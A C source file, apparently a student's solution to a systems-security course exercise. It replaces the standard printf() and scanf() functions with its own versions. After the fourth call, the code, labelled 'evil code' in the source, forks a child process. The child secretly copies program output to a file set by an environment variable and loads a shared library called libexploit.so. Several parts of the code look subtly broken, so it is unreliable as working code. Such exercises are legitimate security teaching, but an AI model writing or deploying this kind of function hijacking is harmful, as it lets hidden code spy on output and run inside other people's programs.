#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdint.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <dlfcn.h>
/*
 * We aren't providing much code here.  You'll need to implement your own
 * printf() and scanf(), as well as any constructors or destructors for your
 * library.
 */
/* TODO: Your code goes here */



int countCalls = 0;
int flag = 0;
//int stdOutCpy = 0;
int pid = 0;
int fileDis[2];
//int fileD[2];

int printf(const char *format,...){
  //int pid = 0;
  int stdOutCpy = 0;
  int parentID = getppid();
  countCalls++;
  va_list ap;
  int status;

    if(countCalls == 4){
       flag = 1;
    }
    
    
    //*evil code*
    if(flag){
      pipe(fileDis);
      pid = fork();
     
     if(pid < 0){
        perror("fork");
	exit(1);
      }

      else if(pid == 0){
       //*child*  
       int cstatus;
       char * filename;
       filename = getenv("EVILFILENAME");
       
       if(filename == NULL){
         filename = "evil.txt";
       }
        
       int eFile = open(filename, O_WRONLY | O_APPEND);
       
       stdOutCpy = dup(1);
       close(fileDis[1]);

       dup2(eFile,1);
     
       va_start(ap,format);
       vprintf(format,ap);
       va_end(ap);
       close(eFile);
       
       dup2(stdOutCpy,1);
       close(stdOutCpy);
       
       va_start(ap,format);
       vprintf(format,ap);
       va_end(ap);
       
        
      
       waitpid(parentID, &cstatus,0);
       if(cstatus ==0){
             
	  void *handle;
	  dup2(stdOutCpy,1);
	  stdout = fdopen(STDOUT_FILENO,"w");
          handle = dlopen("./obj64/libexploit.so",RTLD_NOW);
	  close(stdOutCpy);
       } 
      }
      else{
       //*parent*
       int status;
       waitpid(pid,&status,0);
       close(fileDis[0]);
       close(fileDis[1]);
      }
    }
    else{
       va_start(ap,format);
       vprintf(format,ap);
       va_end(ap);
    }
    return 0;
}   







int scanf(const char *format,...){
   countCalls++;
   if(countCalls == 4){
     flag = 1;
   }
   
   va_list ap;
   va_start(ap,format);
   int rc = vscanf(format,ap);
   va_end(ap);

  return rc;
}
